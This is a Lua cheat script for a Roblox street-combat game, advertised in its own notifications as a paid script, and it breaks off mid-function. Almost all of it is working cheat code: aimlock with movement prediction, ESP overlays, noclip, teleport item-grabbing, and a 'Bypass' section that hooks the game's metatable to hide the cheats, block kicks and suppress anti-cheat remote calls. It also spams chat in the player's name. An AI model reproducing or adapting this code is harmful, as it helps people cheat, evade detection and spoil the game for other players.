local amount = fovamount

game:GetService'Workspace'.Camera.FieldOfView = 100

function onKeyPress(inputObject, gameProcessedEvent)
    if gameProcessedEvent == false then
        if inputObject.KeyCode == Enum.KeyCode.C then
            game.Players.LocalPlayer.Character:BreakJoints()
        end
    end
end

game:GetService("UserInputService").InputBegan:connect(onKeyPress)

local rs = game:GetService("RunService")
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
 
    if (string.lower(msg) == "/god") then
        rs.Heartbeat:Connect(function()
    local ll =game.Players.LocalPlayer.Character:FindFirstChild("Right Leg")
    ll:Destroy()
end)

    end
end)

game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "flowzy";
                    Text = "HittingHeadshots - Aimcancels Paid Script. (;";
                        })

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
    if KeyPressed == "h" then
    game.Players.LocalPlayer.Character["Right Arm"]:Destroy()
end
end)
mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(key)
            if key:lower() == "m" then
                for i,v in pairs (game.Workspace:GetChildren()) do
        if v.Name == "Door" then
                v.Click.ClickDetector.RemoteEvent:FireServer(true)
        end
end
        end
end)

local emojis = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/Aidez/emojiscopy/master/main", true))
local chatbar = nil
repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui")
for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
    if v.Name == "ChatBar" then
        chatbar = v
    end
end

chatbar:GetPropertyChangedSignal("Text"):Connect(function()
    local reversed = string.reverse(chatbar.Text)
    if string.sub(reversed, 1, 1) == ":" and string.find(reversed, ":", 2) then
        local theend = string.find(reversed, ":", 2)
        local emojiname = string.reverse(string.sub(reversed, 2, theend - 1)) 
        if emojis[emojiname] ~= nil then
            local message = string.reverse(string.sub(reversed, theend + 1, -1))..emojis[emojiname].." "
            chatbar.Text = message
        end
    end
end)

game.Players.LocalPlayer.PlayerGui.DescendantAdded:Connect(function(desc)
    if desc.Name == "ChatBar" then
        chatbar = desc
        chatbar:GetPropertyChangedSignal("Text"):Connect(function()
            local reversed = string.reverse(chatbar.Text)
            if string.sub(reversed, 1, 1) == ":" and string.find(reversed, ":", 2) then
                local theend = string.find(reversed, ":", 2)
                local emojiname = string.reverse(string.sub(reversed, 2, theend - 1)) 
                if emojis[emojiname] ~= nil then
                    local message = string.reverse(string.sub(reversed, theend + 1, -1))..emojis[emojiname].." "
                    chatbar.Text = message
                end
            end
        end)
    end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)

if (string.lower(msg) == "/door") then
    local doors = game.Workspace:GetChildren()
for i,v in pairs (doors)do 
    if v.Name == "Door" then
        v:Destroy()
        
     
    end    
    end
end
end)

function deseat(instance) 
    for i,v in pairs(instance:GetChildren()) do
    if v:IsA("Seat") then
        v.Parent = game.Lighting
    end
        deseat(v)
    end
end

deseat(game.Workspace) 

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)

if (string.lower(msg) == "/rejoin") then
local Tp = game:GetService("TeleportService")
local placeID = 4669040

Tp:Teleport(placeID,game.Players.LocalPlayer)
end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/nce") then

local NoclipKey = "x" -- Type a letter in the quotes to change the key that'll toggle noclip



------------------------------------

repeat wait() until game.Players ~= nil
repeat wait() until game.Players.LocalPlayer ~= nil

local LocalP = game.Players.LocalPlayer
local Mouse = LocalP:GetMouse()
local NoClip = false
NoclipKey = string.lower(NoclipKey)
local fakevalue = Instance.new("BoolValue")
fakevalue.Value = false

local meta = getrawmetatable(game)
if PROTOSMASHER_LOADED then
    make_writeable(meta)
else
    setreadonly(meta,false)
end
local index = meta.__index

meta.__index=function(self,k)
    if not checkcaller() or not is_protosmasher_caller() then
        if tostring(self) == "Part" and tostring(k) == "Anchored" then
            return index(fakevalue,"Value")
        end
    end
    return index(self,k)
end

Mouse.KeyDown:Connect(function(key)
    if key == NoclipKey then
        NoClip = not NoClip
        local currenttext = ""
        if NoClip == true then
            currenttext = "on"
        else
            currenttext = "off"
        end
        game.StarterGui:SetCore("SendNotification", {
            Title = "notification";
            Text = currenttext;
            Icon = "rbxassetid://2541869220";
            Duration = 3;
        })
    end
end)

game:GetService('RunService').Stepped:connect(function()
    if NoClip == true then
        if LocalP.Character ~= nil then
            if LocalP.Character:FindFirstChild("Head") and LocalP.Character:FindFirstChild("Torso") and LocalP.Character:FindFirstChild("Humanoid") then
                LocalP.Character.Head.CanCollide = false
                LocalP.Character.Torso.CanCollide = false
                LocalP.Character.Humanoid.Sit = false
            end
        end
    end
end)
end
end)
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)

if (string.lower(msg) == "/re") then
local Tp = game:GetService("TeleportService")
local placeID = 4669040

Tp:Teleport(placeID,game.Players.LocalPlayer)
end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/bs") then

local lighting = game.Lighting
        if lighting:FindFirstChild("ColorCorrection") then
            lighting:FindFirstChild("ColorCorrection"):Remove()
        end
        if lighting:FindFirstChild("Correction") then
            lighting:FindFirstChild("Correction"):Remove()
        end
        
        local sunray = Instance.new("SunRaysEffect", lighting)
        local sky = lighting.Sky
        sky.SkyboxBk = "http://www.roblox.com/asset/?id=185544271"
        sky.SkyboxDn = "http://www.roblox.com/asset/?id=185544298"
        sky.SkyboxFt = "http://www.roblox.com/asset/?id=185544329"
        sky.SkyboxLf = "http://www.roblox.com/asset/?id=185544349"
        sky.SkyboxRt = "http://www.roblox.com/asset/?id=185544367"
        sky.SkyboxUp = "http://www.roblox.com/asset/?id=185544404"
        
        sky.StarCount = 3000
        sky.SunAngularSize = 21
        sky.MoonAngularSize = 11
        
        local correction = Instance.new("ColorCorrectionEffect", lighting)
        correction.Name = "Correction"
        correction.Saturation = -0.4
        correction.TintColor = Color3.fromRGB(224, 241, 255)
end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/fovfix") then
local amount = fovamount

game:GetService'Workspace'.Camera.FieldOfView = 70
end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/fullbright") then
if not _G.FullBrightExecuted then

        _G.FullBrightEnabled = false

        _G.NormalLightingSettings = {
                Brightness = game:GetService("Lighting").Brightness,
                ClockTime = game:GetService("Lighting").ClockTime,
                FogEnd = game:GetService("Lighting").FogEnd,
                GlobalShadows = game:GetService("Lighting").GlobalShadows,
                Ambient = game:GetService("Lighting").Ambient
        }

        game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
                if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
                        _G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
                        if not _G.FullBrightEnabled then
                                repeat
                                        wait()
                                until _G.FullBrightEnabled
                        end
                        game:GetService("Lighting").Brightness = 1
                end
        end)

        game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
                if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
                        _G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
                        if not _G.FullBrightEnabled then
                                repeat
                                        wait()
                                until _G.FullBrightEnabled
                        end
                        game:GetService("Lighting").ClockTime = 12
                end
        end)

        game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
                if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
                        _G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
                        if not _G.FullBrightEnabled then
                                repeat
                                        wait()
                                until _G.FullBrightEnabled
                        end
                        game:GetService("Lighting").FogEnd = 786543
                end
        end)

        game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
                if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
                        _G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
                        if not _G.FullBrightEnabled then
                                repeat
                                        wait()
                                until _G.FullBrightEnabled
                        end
                        game:GetService("Lighting").GlobalShadows = false
                end
        end)

        game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
                if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
                        _G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
                        if not _G.FullBrightEnabled then
                                repeat
                                        wait()
                                until _G.FullBrightEnabled
                        end
                        game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
                end
        end)

        game:GetService("Lighting").Brightness = 1
        game:GetService("Lighting").ClockTime = 12
        game:GetService("Lighting").FogEnd = 786543
        game:GetService("Lighting").GlobalShadows = false
        game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)

        local LatestValue = true
        spawn(function()
                repeat
                        wait()
                until _G.FullBrightEnabled
                while wait() do
                        if _G.FullBrightEnabled ~= LatestValue then
                                if not _G.FullBrightEnabled then
                                        game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
                                        game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
                                        game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
                                        game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
                                        game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
                                else
                                        game:GetService("Lighting").Brightness = 1
                                        game:GetService("Lighting").ClockTime = 12
                                        game:GetService("Lighting").FogEnd = 786543
                                        game:GetService("Lighting").GlobalShadows = false
                                        game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
                                end
                                LatestValue = not LatestValue
                        end
                end
        end)
end

_G.FullBrightExecuted = true
_G.FullBrightEnabled = not _G.FullBrightEnabled
end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/fov") then
local amount = fovamount

game:GetService'Workspace'.Camera.FieldOfView = 100
end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/aimlock") then
targetee = nil
pleaseshoot = false
mouse = game.Players.LocalPlayer:GetMouse()

local TargetGUI = Instance.new("ScreenGui")
local Target = Instance.new("TextBox")
local Background = Instance.new("ImageLabel")

TargetGUI.Name = "TargetGUI"
TargetGUI.Parent = game.CoreGui




local debounce = false
function fireat(target)
if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Fire then
u = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Fire
if target.Character then
                                u:FireServer(targetee.Character.Torso.CFrame + targetee.Character.HumanoidRootPart.Velocity/10) 
end
end
end

end


Target.FocusLost:Connect(function()
local name = string.lower(Target.Text)
local player = nil

names = game.Players:GetChildren()
                                
                            for i,x in pairs(names) do
                                strlower = string.lower(x.Name)
                                sub = string.sub(strlower,1,#name)                      
                                
                                if name == sub then 
                                    player = x
                                    if player.Name ~= game.Players.LocalPlayer.Name and x.Name ~= "Vortexturize" then
                                        targetee = player
                                    end
                                end
                            end
end)

function ShootGlocks(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.E and gameProcessedEvent == false then
        fireat(targetee)
    end
end
function UnShootGlocks(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.E and gameProcessedEvent == false then
        pleaseshoot = false
    end
end
function CtrlSelect(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.Q and gameProcessedEvent == false then
        Selecting = true
    end
end
function UnCtrlSelect(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.Q and gameProcessedEvent == false then
        Selecting = false
    end
end



game:GetService("UserInputService").InputBegan:connect(ShootGlocks)
game:GetService("UserInputService").InputEnded:connect(UnShootGlocks)
game:GetService("UserInputService").InputBegan:connect(CtrlSelect)
game:GetService("UserInputService").InputEnded:connect(UnCtrlSelect)



game:GetService('RunService').Stepped:connect(function()
   
    if Selecting == true then
        if mouse.Target then
            if mouse.Target.Parent:IsA("Model") and game.Players:FindFirstChild(mouse.Target.Parent.Name) then
                Target.Text = mouse.Target.Parent.Name
                targetee = game.Players:FindFirstChild(mouse.Target.Parent.Name)
            end
        end
    end
end)
end
end)

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "/hvh") then

game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer("[GLOCKYS PAID] Dollars's combat script has been loaded [NO MORE MESSAGES] Have Fun!!!","All")

if pcall(readfile,"CyrusStreetsAdminSettings") then
    writefile("CyrusStreetsAdminSettings.json",readfile("CyrusStreetsAdminSettings"))
        if delfile then
                 delfile("CyrusStreetsAdminSettings")
        end
end 
local Tick = tick()
getgenv().Players = game:GetService'Players'
getgenv().TeleportService = game:GetService'TeleportService'
getgenv().ReplicatedStorage = game:GetService'ReplicatedStorage' 
getgenv().StarterGui = game:GetService'StarterGui'
getgenv().TweenService = game:GetService'TweenService'
getgenv().UserInput = game:GetService'UserInputService'
getgenv().RunService = game:GetService'RunService'
getgenv().Lighting = game:GetService'Lighting'
getgenv().CoreGui = game:GetService'CoreGui'
getgenv().HttpService = game:GetService'HttpService'
getgenv().MarketplaceService = game:GetService'MarketplaceService'
getgenv().LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
getgenv().Mouse = LP:GetMouse()
getgenv().GetChar = function() return LP.Character or LP.CharacterAdded:Wait() end
GetChar():WaitForChild('Humanoid',10) -- allows auto-execution
local PlayerTable,Commands,KeyTable,UrlEncoder,AdminUsers,DontStompWhitelisted = {},{},{['w'] = false;['a'] = false;['s'] = false;['d'] = false;['Shift'] = false;['Control'] = false;},{['0'] = "%30";['1'] = "%31";['2'] = "%32";['3'] = "%33"; ['4'] = "%34";['5'] = "%35";['6'] = "%36";['7'] = "%37";['8'] = "%38";['9'] = "%39";[' '] = "%20";},{},{}
local NormalWS,NormalJP,NormalHH = GetChar().Humanoid.WalkSpeed,GetChar().Humanoid.JumpPower,GetChar().Humanoid.HipHeight
local AimLock,GodMode,AutoDie,AliasesEnabled,Noclipping,AutoFarm,ItemEsp,WalkShoot,flying,AutoStomp,Freecam,CamLocking,FeLoop,TpBypass,HealBot = false,false,false,true,false,false,false,false,false,false,false,false,false,false,false
local BlinkSpeed,SpawnWS,SpawnJP,SpawnHH,ClockTime,PlayOnDeath,AimlockTarget,CamlockPlayer,LoopPlayer
local AirWalk = Instance.new'Part'
local Cframe = Instance.new("Frame",CoreGui.RobloxGui)
local CText,CmdFrame,MainFrame,DmgIndicator = Instance.new("TextBox",Cframe),Instance.new("Frame",Cframe),Instance.new('Frame',CoreGui.RobloxGui),Instance.new('TextLabel',LP.PlayerGui.Chat.Frame)
local ScrollingFrame,SearchBar,Credits = Instance.new('ScrollingFrame',MainFrame),Instance.new('TextBox',MainFrame),Instance.new('TextLabel',MainFrame)
local BulletColour,ItemEspColour,EspColour = ColorSequence.new(Color3.fromRGB(144,0,0)),Color3.fromRGB(200,200,200),Color3.fromRGB(200,200,200)
local UseDraw,DrawingT = pcall(assert,Drawing,'test')
local ShiftSpeed,ControlSpeed,WalkSpeed,HealBotHealth,BlinkSpeed,AimbotVelocity = 25,8,16,25,1,5
local OldFov = workspace.CurrentCamera.FieldOfView
local Config = "CyrusStreetsAdminSettings"
local TargetPart,AimlockMode = "Prediction","LeftClick"
Players:Chat("Cyrus is my god")
Players:Chat("Hey I'm a cyrus' streets admin user1")
local RobloxInForeground = true 
local DrawTable = {
        ['LineColour'] = Color3.fromRGB(0,144,0);
        ['Thickness'] = 1;
        ['Transparency'] = 1;
        ['Visible'] = true;
}

if UseDraw then 
        DrawingT = Drawing.new'Text'
        DrawingT.Visible = true
        DrawingT.Center = true 
        DrawingT.Size = 15
        DrawingT.Position = Vector2.new((workspace.CurrentCamera.ViewportSize.X / 2) - 450, (workspace.CurrentCamera.ViewportSize.Y - 125))
        DrawingT.Color = Color3.fromRGB(255,255,255)
        DrawingT.Text = "Current WalkSpeed: "..GetChar().Humanoid.WalkSpeed.."\nSprinting Speed: "..ShiftSpeed.."\nCrouching Speed: "..ControlSpeed.."\nJumpPower: "..GetChar().Humanoid.JumpPower.."\nFlying: "..tostring(flying).."\nNoclipping: "..tostring(Noclipping).."\nAimlock Target: "..tostring(AimlockTarget)
end 

if workspace:FindFirstChild'Armoured Truck' then
        PartTable = {
                ['Burger'] = workspace:WaitForChild'Burger | $15';
                ['Drink'] = workspace:WaitForChild'Drink | $15';
                ['Ammo'] = workspace:WaitForChild'Buy Ammo | $25';
                ['Pipe'] = workspace:WaitForChild'Pipe | $100';
                ['Machete'] = workspace:WaitForChild'Machete | $70';
                ['SawedOff'] = workspace:WaitForChild'Sawed Off | $150';
                ['Spray'] = workspace:WaitForChild'Spray | $20';
                ['Uzi'] = workspace:WaitForChild'Uzi | $150';
                ['Glock'] = workspace:WaitForChild'Glock | $200';
        }
    workspace["Armoured Truck"]:Destroy()
elseif workspace:FindFirstChild'TPer' then 
    workspace['TPer']:Destroy()
end

LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
--^ Ty to Jayy#0648 for this "Hack" for bringing back normal chat 

local SettingsTable = {
   Keys = {};
   ClickTpKey = "";
   ShiftSpeed = 25;
   ControlSpeed = 8;
   TargetPart = "Prediction";
   AimlockMode = "LeftClick";
   BlinkMode = "Shift";
   AimbotVelocity = 10;
}

-- Hotkey start

local function savesettings()
        writefile(Config..".json",HttpService:JSONEncode(SettingsTable))
    local SettingsToSave = HttpService:JSONDecode(readfile(Config..".json"))
    Keys = SettingsToSave.Keys;
        ClickTpKey = SettingsToSave.ClickTpKey;
        ShiftSpeed = SettingsToSave.ShiftSpeed;
        ControlSpeed = SettingsToSave.ControlSpeed;
        TargetPart = SettingsToSave.TargetPart;
        AimlockMode = SettingsToSave.AimlockMode;
        BlinkMode = SettingsToSave.BlinkMode;
        AimbotVelocity = SettingsToSave.AimbotVelocity;
end 

getgenv().updateSettings = function()
    local New = { 
        Keys = Keys;
                ClickTpKey = ClickTpKey;
                ShiftSpeed = ShiftSpeed;
                ControlSpeed = ControlSpeed;
                TargetPart = TargetPart;
                AimlockMode = AimlockMode;
                BlinkMode = BlinkMode;
                AimbotVelocity = AimbotVelocity;
    }
    writefile(Config..".json",HttpService:JSONEncode(New))
end

local function runsettings()
        local SettingsToRun = HttpService:JSONDecode(readfile(Config..".json"))
    Keys = SettingsToRun.Keys
        ClickTpKey = SettingsToRun.ClickTpKey
        BlinkMode = SettingsToRun.BlinkMode
        if SettingsToRun.AimlockMode then 
                AimlockMode = SettingsToRun.AimlockMode
        end
        if SettingsToRun.TargetPart then 
                TargetPart = SettingsToRun.TargetPart
        end
        if SettingsToRun.ShiftSpeed and SettingsToRun.ControlSpeed then 
                ShiftSpeed = SettingsToRun.ShiftSpeed;
                ControlSpeed = SettingsToRun.ControlSpeed;
        end 
        if SettingsToRun.AimbotVelocity then 
                AimbotVelocity = SettingsToRun.AimbotVelocity
        end
end

if readfile and writefile then 
        local Work,Error = pcall(readfile,Config..".json")
        if not Work then 
                local Work,Error = pcall(savesettings)
                if not Work then 
                        print'Error with saving settings' 
                end 
        else
                local Work,Error = pcall(runsettings)
                if not Work then 
                        print'Error with running settings'
                end 
        end
end 

-- Hotkey end 

-- Bypass Start

local gamememe = getrawmetatable(game)
local Closure,Caller = newcclosure,checkcaller or is_protosmasher_caller or Cer.isCerus
local writeable = setreadonly or make_writeable
local callingscript = getcallingscript or get_calling_script
local name,index,nindex = gamememe.__namecall,gamememe.__index,gamememe.__newindex
writeable(gamememe,false)

gamememe.__index = Closure(function(self,Index)
        if TpBypass and callingscript and callingscript() ~= script and Index == "HumanoidRootPart" then -- was requested to add this
                return index(self,"Torso")
        end 
        return index(self,Index)
end)

gamememe.__newindex = Closure(function(self,Property,b)
if Caller() then return nindex(self,Property,b) end
        if self:IsA'Humanoid' then 
        game:GetService'StarterGui':SetCore('ResetButtonCallback',true)
                if Property == "WalkSpeed" then
                        if WalkShoot then 
                                return
                        end
                end
                if Property == "Health" or Property == "JumpPower" or Property == "HipHeight"  then 
                        return 
                end
        end
        if Property == "CFrame" and self:IsDescendantOf(LP.Character) then
                return 
        end
        return nindex(self,Property,b)
end)

gamememe.__namecall = Closure(function(self,...)
local Arguments = {...}
        if Caller() then 
                if getnamecallmethod() == "FindFirstChild" then
                        if Arguments[1] == "RealHumanoidRootPart" then 
                                Arguments[1] = "HumanoidRootPart" 
                                return name(self,unpack(Arguments))
                        end
                end
                return name(self,...) 
        end 
                if getnamecallmethod() == "Destroy" and tostring(self) == "BodyGyro" or getnamecallmethod() == "Destroy" and tostring(self) == "BodyVelocity" then
                        return wait(9e9)
                end
                if getnamecallmethod() == "BreakJoints" and self.Name == LP.Character.Name then
                        return wait(9e9)
                end
                if getnamecallmethod() == "Kick" or getnamecallmethod() == "Destroy" and tostring(self) == tostring(LP) then 
                        return
                end
                if getnamecallmethod() == "WaitForChild" or getnamecallmethod() == "FindFirstChild" then 
                        if callingscript and callingscript() ~= script and TpBypass and Arguments[1] == "HumanoidRootPart" then
                                Arguments[1] = "Torso"
                                return name(self,unpack(Arguments))
                        end
                end
                if getnamecallmethod() == "FireServer" then
                                if self.Name == "lIII" or tostring(self.Parent) == "ReplicatedStorage" then 
                                        return wait(9e9)
                                end
                                if Arguments[1] == "hey" then 
                                        return wait(9e9)
                                end
                                if Arguments[1] == "play" then
                                        local TempTable = {}
                                        tostring(Arguments[2]):gsub('.',function(Char)
                                                        if UrlEncoder[Char] then 
                                                                table.insert(TempTable,UrlEncoder[Char])
                                                        else 
                                                        table.insert(TempTable,Char)
                                                end
                                        end)
                                        Arguments[2] = table.concat(TempTable,"")
                                        PlayOnDeath = Arguments[2]
                                        return name(self,unpack(Arguments))
                                end
                if Arguments[1] == "stop" then 
                        PlayOnDeath = nil 
                end
        end
        if LP.Character.FindFirstChildOfClass(LP.Character,"Tool") and typeof(Arguments[1]) == "CFrame" then
                if AimlockTarget and AimLock then
                        if TargetPart == "Prediction" then
                                if AimlockTarget.FindFirstChild(AimlockTarget,"HumanoidRootPart") then
                                        return name(self,AimlockTarget.Head.CFrame + AimlockTarget.HumanoidRootPart.Velocity / AimbotVelocity)
                                else 
                                        return name(self,AimlockTarget.Head.CFrame + AimlockTarget.Torso.Velocity / AimbotVelocity)
                                end 
                        else
                                if AimlockTarget.FindFirstChild(AimlockTarget,TargetPart) then 
                                        return name(self,AimlockTarget[TargetPart].CFrame) 
                                else
                                        notif(tostring(AimlockTarget).." doesn't have that part in their character.","I recommend switching to something else.",5,nil)
                                end
                        end
                end
        end 
    return name(self,...)
end)

writeable(gamememe,true)
-- Bypass End

getgenv().notif = function(title,message,length,icon)
        StarterGui:SetCore("SendNotification",{['Title'] = title;['Text'] = message;['Duration'] = length;['Icon'] = icon;})
end

getgenv().Teleport = function(Part)
if not typeof(Part) == "CFrame" then return end
local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
        if not GetChar():FindFirstChild'HumanoidRootPart' then 
                PartFound.CFrame = Part
        else
                local Play = TweenService:Create(PartFound, TweenInfo.new(3.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),{CFrame = Part})
                Play:play()
        end
end

local function hasItem(Player,Item)
    if type(Item) == "boolean" then
        local Tool = Player.Character:FindFirstChildOfClass'Tool'
        if Tool then 
            return Tool.Name
        else
            return 'none'
        end
    end
    if Player.Backpack:FindFirstChild(Item) or Player.Character:FindFirstChild(Item) then
        return 'yes' 
    else
        return 'no'
    end
end 

local function checkHp(Plr)
        return Plr:FindFirstChildOfClass'Humanoid' and Plr.Humanoid.Health or "No Humanoid"
end

local function LegacyEsp(Player)
if not Player.Character or not Player.Character:FindFirstChild'Head' then return end 
        local Esp1 = Instance.new("BillboardGui",Player.Character)
        local Text = Instance.new("TextLabel",Esp1)
        Esp1.Adornee = Player.Character.Head
        Esp1.Name = "[ESP]"..Player.Name
        Esp1.Size = UDim2.new(0,100,0,100)
        Esp1.StudsOffset = Vector3.new(0,1,0)
        Esp1.AlwaysOnTop = true
        Text.BackgroundTransparency = 1
        Text.Position = UDim2.new(0,0,0,0)
        Text.Size = UDim2.new(1,0,0,40)
        Text.TextStrokeTransparency = 0.5
        Text.TextSize = 25
        local PCChild = Player.Character:GetChildren()
        RunService.Stepped:Connect(function()
                if Player and Player.Character and Player.Character:FindFirstChild'Head' and GetChar():FindFirstChild'Head' then 
                        Text.Text = Player.Name.." Position: "..math.floor((GetChar().Head.Position - Player.Character.Head.Position).magnitude)
                        Text.TextStrokeColor3 = EspColour
                        Text.TextColor3 = EspColour
                end
        end)
        return Esp1
end 

local EspTable = {} 
local function espPlayer(Player,Method,IsUser)
if not Player.Character or not Player.Character:FindFirstChild'Head' then return end
if not IsUser then IsUser = "GLOCKY USER X CY" else IsUser = "GLOCKY USER X CY" end 
if table.find(AdminUsers,Player.UserId) then IsUser = "GLOCKY USER X CY" end 
        if not UseDraw or Method == "Legacy" then
                local Esp1 = LegacyEsp(Player)
                local CAdded;
                CAdded = Player.CharacterAdded:Connect(function(C)
                        if table.find(EspTable,Player.UserId) then 
                                C:WaitForChild('Head',10)
                                Esp1 = LegacyEsp(Player)
                        else 
                                CAdded:Disconnect()
                        end
                end)
        else 
                local TopLeft,TopRight,BottomLeft,BottomRight = Drawing.new'Line',Drawing.new'Line',Drawing.new'Line',Drawing.new'Line'
                local Text = Drawing.new'Text'
                TopLeft.Color = Color3.fromRGB(148,0,211)
                TopRight.Color = Color3.fromRGB(148,0,211)
                BottomLeft.Color = Color3.fromRGB(148,0,211)
                BottomRight.Color = Color3.fromRGB(148,0,211)
                local Tracer = Drawing.new'Line'
                PlayerTable[#PlayerTable + 1] = {Player,TopLeft,TopRight,BottomLeft,BottomRight,Text,Tracer,IsUser}
        end 
end

local function Unesp(P)
        for i = 1,#PlayerTable do
                if PlayerTable[i] and PlayerTable[i][1] == P then
                        PlayerTable[i][2]:Remove()
                        PlayerTable[i][3]:Remove()
                        PlayerTable[i][4]:Remove()
                        PlayerTable[i][5]:Remove()
                        PlayerTable[i][6]:Remove()
                        PlayerTable[i][7]:Remove()
                        PlayerTable[i][8] = nil 
                        table.remove(PlayerTable,i)
                end 
        end
end 

local function GrabThing(Thing,OldPos)
if not PartTable then 
        notif("Can't tp to "..Thing,"as you are not playing normal streets!",5,"rbxassetid://1281284684") return 
end
local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
local Anim = Instance.new'Animation'
Anim.AnimationId = "rbxassetid://188632011"
local Track = GetChar().Humanoid:LoadAnimation(Anim)
PartFound.CFrame = PartFound.CFrame * CFrame.new(math.random(20,45),0,math.random(1,5))
wait()
        repeat  
                Track:play(.1,1,1)
                PartFound.CFrame = PartTable[Thing]:FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,0.5,0)
                RunService.Heartbeat:wait()
        until PartTable[Thing]:FindFirstChildOfClass'Part'.BrickColor == BrickColor.new'Bright red' or GetChar():FindFirstChild'KO' or GetChar().Humanoid.Health == 0
        PartFound.CFrame = OldPos
        return true
end 

local function Button1Down()
local MTarget = Mouse.Target
        if GetChar():FindFirstChild'Zetox Btools' then 
                Mouse.Target:Destroy()
        end
        if MTarget and MTarget.Parent then 
                local NTarget = MTarget.Parent 
                if not Players:GetPlayerFromCharacter(NTarget) then NTarget = NTarget.Parent end 
                if not Players:GetPlayerFromCharacter(NTarget) then return end 
                if NTarget ~= LP.Character and NTarget ~= AimlockTarget and AimLock and AimlockMode == "LeftClick" then 
                        AimlockTarget = NTarget
                        local Connection;
                        Connection = Players:GetPlayerFromCharacter(NTarget).CharacterAdded:Connect(function(C)
                                if tostring(AimlockTarget) == tostring(C) then 
                                        AimlockTarget = C 
                                else
                                        Connection:Disconnect()
                                end 
                        end)
                        notif("AimlockTarget has been set to",AimlockTarget.Name,5,nil)
                end
        end
end

local function BehindAWall(Target)
        local RYEBread = Ray.new(workspace.CurrentCamera.CoordinateFrame.p,Target.Head.Position - workspace.CurrentCamera.CoordinateFrame.Position)
        local RYEBreadHit = workspace:FindPartOnRay(RYEBread)
        if RYEBreadHit then 
                if RYEBreadHit:IsDescendantOf(Target) then 
                        return false
                else
                        return true 
                end 
        end 
end

local function closestToMouse()
local ClosestPos,ClosestPlayer = math.huge,nil
        for i,v in pairs(Players:GetPlayers()) do 
                if v.Character and v.Character:FindFirstChild'Head' and v ~= LP then 
                        local Dist = (v.Character.Head.Position - workspace.CurrentCamera.CoordinateFrame.Position).magnitude
                        local RYETarget = Ray.new(workspace.CurrentCamera.CoordinateFrame.Position,(Mouse.Hit.p - workspace.CurrentCamera.CoordinateFrame.Position)).unit
                        local RYEHit,RYEPos = workspace:FindPartOnRay(RYETarget,workspace)
                        local NewPos = math.floor((RYEPos - v.Character.Head.Position).magnitude)
                        if NewPos < 500 and NewPos < ClosestPos and not BehindAWall(v.Character) then
                                ClosestPos = NewPos
                                ClosestPlayer = v 
                        end
                end
        end
        return ClosestPlayer
